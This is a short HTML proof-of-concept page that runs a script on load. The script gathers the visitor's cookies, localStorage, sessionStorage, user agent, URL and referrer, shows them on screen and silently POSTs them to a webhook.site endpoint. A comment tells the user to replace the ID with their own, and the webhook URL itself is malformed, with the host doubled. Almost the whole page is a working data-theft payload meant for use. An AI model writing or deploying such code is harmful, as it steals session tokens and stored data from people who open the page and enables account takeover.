<!DOCTYPE html>
<html>
<head><title>PoC Test</title></head>
<body style="background:#111;color:#0f0;font-family:monospace;padding:20px;">

<h2 id="status">⏳ Collecting...</h2>
<pre id="output"></pre>

<script>
  setTimeout(function() {

    var data = {
      cookies:        document.cookie || "(empty)",
      localStorage:   JSON.stringify(localStorage),
      sessionStorage: JSON.stringify(sessionStorage),
      userAgent:      navigator.userAgent,
      url:            window.location.href,
      referrer:       document.referrer || "(none)",
      timestamp:      new Date().toISOString()
    };

    // ✅ Show results on screen
    document.getElementById('status').innerText = '✅ Done!';
    document.getElementById('output').innerText = JSON.stringify(data, null, 2);

    // ✅ Send to your webhook - REPLACE the ID below
    fetch('https://webhook.site/https://webhook.site/d185f8a4-925a-4573-8a27-e149a3569962', {
      method: 'POST',
      mode: 'no-cors',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data)
    });

  }, 2000);
</script>

</body>
</html>
